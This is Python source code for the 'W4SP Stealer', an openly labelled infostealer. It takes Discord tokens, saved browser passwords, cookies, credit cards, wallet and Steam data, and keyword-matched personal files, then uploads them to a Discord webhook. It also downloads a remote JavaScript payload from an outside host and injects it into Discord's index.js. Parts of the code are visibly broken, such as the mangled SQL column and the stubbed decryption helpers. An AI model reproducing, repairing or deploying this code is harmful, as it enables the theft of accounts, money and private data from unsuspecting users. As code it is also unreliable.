#  W4SP STEALER
#    BY W4SP, loTus04
# 

import os
import threading
from sys import executable
# from urllib.request import Request, urlopen
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from urllib.request import Request, urlopen
from json import loads, dumps
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
# from turtle import up

from Crypto.Cipher import AES
import re
import subprocess
import requests
import shutil
# from zipfile import ZipFile
import random
from colorama import Fore

def InstallRequests():
    os.system(f"{executable} -m pip install requests")

def InstallCrypto():
    try:
        from Crypto.Cipher import AES
    except:
        os.system(f"{executable} -m pip install pycryptodome")

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    buffer = blob_out.pbData
    cdll.msvcrt.memcpy(buffer, cbData)
    return cdll.msvcrt.memcpy(buffer, cbData)

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    return GetData(buffer_entropy)

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def getwallet(path, arg, procc):
    if not os.path.isfile(f"{procc}/loginusers.vdf"): return
    f = open(f"{procc}/loginusers.vdf", "r+", encoding="utf8")
    data = f.readlines()
    # print(data)
    found = False
    for l in data:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
    if found == False: return
    name = arg

def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}

    ]
    for badge in badgeList:
        if flags % badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    # if not checkToken(token): return
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)


    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"


    billing = GetBilling(token)
    badge = GetBadge(flags)
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    # print(pfp)
    # billing = 's'

    if nitro == '' and badge == '': nitro = " -"


    data = {
        "content": f'Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "username": "W4SP Stealer",
        "attachments": []
        }
    if badge in ":dev::grosmodo:...":
        hook = "..."
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    InstallCrypto()
    from Crypto.Cipher import AES

    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def injectDiscord():
    if not os.path.exists(f"{roaming}/Discord"): return
    global hook
    for path in [f"{os.getenv('LOCALAPPDATA')}\\discord\\",f"{os.getenv('APPDATA')}\\Discord\\",f"{os.getenv('APPDATA')}\\Lightcord\\",f"{os.getenv('APPDATA')}\\discordptb\\",f"{os.getenv('APPDATA')}\\discordcanary\\"]:
        # try:

        for file in os.listdir(path):
            if "index.js" in file.lower():
                if not "W4SPStealer" in os.listdir(path):
                    os.makedirs(path+"\\W4SPStealer")
                paylaod = urlopen("http://zerotwo-best-waifu.online/discord_injection_byHazard").read().decode("utf8").replace("%WEBHOOK%",hook).replace("%IP%",f"{getip()}")
                
                f = open(path+"index.js", 'r+', encoding="UTF-8")
                if not 'const ANCHOR = "W4SP Stealer"' in str(f.read()):
                    f.write(paylaod)
                    subprocess.Popen("taskkill /im discord.exe /t /f", shell=True)
                    # os.system("taskkill /im discord.exe /t /f")
                return

def upload(name, tk=''):
    InstallRequests()
    import requests
    # if tk:
    #     requests.get(f'https://xxxxxxxxxxxxxxxxxxxxxxxxxxx?tk={name}')
    #     print(f"https://xxxxxxxxxxxxxxxxxxxxxxxxxxx?tk={name}")

    # else:
    hook = "DISCORD_WEBHOOK"

    if name == "kiwi":
        data = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": name
                }
            ],
            "author": {
                "name": "W4SP | File Stealer"
            },
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
        }
        requests.post(hook, data=data)
        return

    # if name == "line":
    #     payload = {"content": "=-"*50}
    #     requests.post(hook, data=payload)
    #     return

    path = name
    files = {'file': open(path, 'rb')}

    if "wppassw" in name:
        ra = ' '.join(da for da in paswWords)
        payload = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": ra
                }
            ],
            "author": {
                "name": "W4SP | Password Stealer"
            },
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
        }
        requests.post(hook, data=payload)
        # print(paswWords)
    if "wpcook" in name:
        rb = ' '.join(da for da in cookiWords)
        payload = {
        "content": '',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": "Found:",
                "value": rb
                }
            ],
            "author": {
                "name": "W4SP | Cookies Stealer"
            },
            "footer": {
                "text": "@W4SP STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
            }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
        "attachments": []
        }
        # print(cookiWords)
    requests.post(hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w') as f:
        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = []
def getToken(path, arg):
    global Tokens
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith("ldb") or file.endswith(".sqlit"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{8}\.[\w-]{25}\.[\w-]{12}", r"mfa\.[\w-]{15}"):
                    for token in re.findall(regex, line):
                        
                        if token not in Tokens:
                            Tokens.append(token)
                            # upload(token, tk=True)
                            # print(token)
                            writeforfile(Tokens, 'tokens')

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

Passw = []
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                if wa in row[0]:
                    if not wa in paswWords: paswWords.append(wa)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookie")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                if wa in row[0]:
                    if not wa in cookiWords: cookiWords.append(wa)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], 'master_key')}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(Cookies, 'cook')

# def getCookie(path, arg):
#     global Cookies
#     if not os.path.exists(path): return
    
#     pathC = path + arg + "/Cookies"
#     if os.stat(pathC).st_size == 0: return
    
#     tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
#     conn = sql_connect(tempfold)
#     cursor = conn.cursor()
#     cursor.execute("SELECT host_key, name, encrypted_value FROM cookie")
#     data = cursor.fetchall()
#     cursor.close()
#     conn.close()
#     os.remove(tempfold)

#     pathKey = path + "/Local State"
    
#     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
#     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
#     master_key = CryptUnprotectData(master_key[5:])

#     for row in data: 
#         if row[0] != '':
#             for wa in keyword:
#                 if wa in row[0]:
#                     if not wa in cookiWords: cookiWords.append(wa)
#             Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
#         # print([row[0], row[1], DecryptValue(row[2], master_key)])
#     writeforfile(Cookies, 'cook')

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

CreditCards = []
def getCredCard(path, arg):
    global CreditCards
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Web Data"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, expiration_month, expira,tion_year, card_number_encrypted FROM credit_cards;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            CreditCards.append(f'''---------------------------------------------\nNumber: {DecryptValue(row[3], master_key)}\nDate: {row[1]}/{row[2]}\nName: {row[0]}\n---------------------------------------------''')
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    writeforfile(CreditCards, 'cc')


def getExodus():
    pass


def GatherAll():
    '                default path |                        token |        password | cookies                                      | cc'
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable", "/Local Storage/leveldb", "/", "/Network"],
        [f"{roaming}/Opera Software/Opera Stable", "/Local Storage/leveldb", "/", "/Network"],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "/Local Storage/leveldb", "/", "/Network"],
        [f"{local}/Google/Chrome/User Data/", "/Default/Local Storage/leveldb", "/Default", "/Default/Network"],
        [f"{local}/Google/Chrome SxS/User Data", "/Default/Local Storage/leveldb", "/Default", "/Default/Network"],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "/Default/Local Storage/leveldb", "/Default", "/Default/Network"],
        [f"{local}/Yandex/YandexBrowser/User Data", "Default/Local Storage/leveldb", "/Default", "Default/Network"],
        [f"{local}/Microsoft/Edge/User Data", "/Default/Local Storage/leveldb", "/Default", "/Default/Network"]
    ]

    discordPaths = [
        roaming + "/Discord/Local Storage/leveldb",
        roaming + "/Lightcord/Local Storage/leveldb",
        roaming + "/discordcanary/Local Storage/leveldb",
        roaming + "/discordptb/Local Storage/leveldb",
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]

    # otherPaths = [
    #     roaming + "Exodus/exodus.wallet"
    #      roaming + "Exodus/atomic"

    # ]
    
    # load tokens
    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)
    # for patt in discordPaths: 
    #     a = threading.Thread(target=getToken, args=[patt, ''])
    #     a.start()
    #     Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getCredCard, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    
    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []
    upload("line")
    for file in ["wppassw.txt", "wpcook.txt", "wpcc.txt", "wptokens.txt"]: # "wptokens.txt"
        # upth = threading.Thread(target=upload, args=[os.getenv("TEMP") + "\\" + file])
        upload(os.getenv("TEMP") + "\\" + file)
        # upth.start()
        # upths.append(upth)


KiwiFiles = []
def KiwiSearch(path, keywords):
    global KiwiFiles
    listOfFile = os.listdir(path)

    for file in listOfFile:
        for worf in keywords:
            if worf in file and ".txt" in f"{path}/{file}":
                KiwiFiles.append(path + "/" + file)
                break


def Kiwi():
    user = temp.split("/AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_words =[
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiSearch, args=[patt, key_words])
        kiwi.start()
        wikith.append(kiwi)

global keyword, cookiWords, paswWords
keyword = [
    'mail', 'coinbase', 'gmail', 'steam', 'discord', 'riotgames', 'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 'expressvpn', 'crypto', 'uber', 'netflix'
]


cookiWords = []
paswWords = []

GatherAll()
Kiwi()

for thread in Threadlist: thread.join()
# for thread in upths: thread.join()

os.system('')
upload('kiwi')
for file in KiwiFiles:
    if os.path.isfile(file):
        if not "-" in file:# file and not "'" in file and not '"' in file:
            # threading.Thread(target=upload, args=[file]).start()
            upload(file)
upload("line")
        #     print(file)
        # else: 
        #     print(f"{Fore.RED}{file}{Fore.RESET}")

    # import time
    # time.sleep(1)
    # for a in KiwiFiles: print(a)
        # print(KiwiFiles)
# except Exception as e:
#     pass